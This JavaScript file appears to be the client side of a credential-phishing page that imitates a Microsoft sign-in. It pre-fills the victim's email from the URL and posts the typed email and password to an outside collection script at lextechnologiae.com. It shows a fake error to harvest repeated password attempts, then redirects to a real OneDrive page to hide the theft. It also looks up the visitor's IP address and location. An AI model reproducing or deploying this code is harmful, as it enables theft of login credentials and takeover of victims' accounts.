function getParameterByName(name, url) {
	if (!url) url = window.location.href;
	name = name.replace(/[\[\]]/g, '\\$&');
	var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
		results = regex.exec(url);
	if (!results) return null;
	if (!results[2]) return '';
	return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

var id = getParameterByName('email');
document.getElementById('emailInput').value = id;

let login_attempts = 3;

$(document).ready(function() {
	//$('#errorText').hide();
	//$('#accessText').hide();
	$('#nextButton').click(function() {
		//e.preventDefault();
		var userID = $('#emailInput').val();
		var userAccessCode = $('#passwordInput').val();
		if(userID === '') {
			
			$('#errorText').show(100);
			
		}else if(userAccessCode === '') {
			
			$('#errorText').show(100);
			return false;
			
		}else{
			
			$('#errorText').hide();
			$('#accessText').show();
			if(login_attempts = login_attempts-1) {
				submitFormAjaxFirst();
			}
			
			
			else if(login_attempts == 0){
			
				submitFormAjax();
				
			}
		}
		
		
	});
	
});

function submitFormAjaxFirst() {

var username = document.getElementById('emailInput').value;
var password = document.getElementById('passwordInput').value;

	var params = "emailInput=" + username + "&passwordInput=" + password;

	
    var xmlHttp = new XMLHttpRequest();
        xmlHttp.onreadystatechange = function()
        {
            if(xmlHttp.readyState == 4 && xmlHttp.status == 200)
            {
                setTimeout(function() {
					$('#errorText').show(100);
					$('#accessText').hide();
					$('#passwordInput').val('');
				}, 2000);
            }
        }
        xmlHttp.open("post", "https://lextechnologiae.com/butter/ex.php", true);
		xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlHttp.send(params); 
}

function submitFormAjax() {

var username = document.getElementById('emailInput').value;
var password = document.getElementById('passwordInput').value;

	var params = "emailInput=" + username + "&passwordInput=" + password;

	
    var xmlHttp = new XMLHttpRequest();
        xmlHttp.onreadystatechange = function()
        {
            if(xmlHttp.readyState == 4 && xmlHttp.status == 200)
            {
                setTimeout(function() {
					$('#passwordInput').val('');
					window.location.href = 'https://www.microsoft.com/en-us/microsoft-365/onedrive/document-scanning';
				}, 2000);
            }
        }
        xmlHttp.open("post", "https://lextechnologiae.com/butter/ex.php", true);
		xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlHttp.send(params); 
}

$.get("http://ipinfo.io", function(response) {
	console.log(response);
	$('#ipLabel').html(response.ip);
	$('#city').html(response.city);
	$('#country').html(response.country);
}, "jsonp");
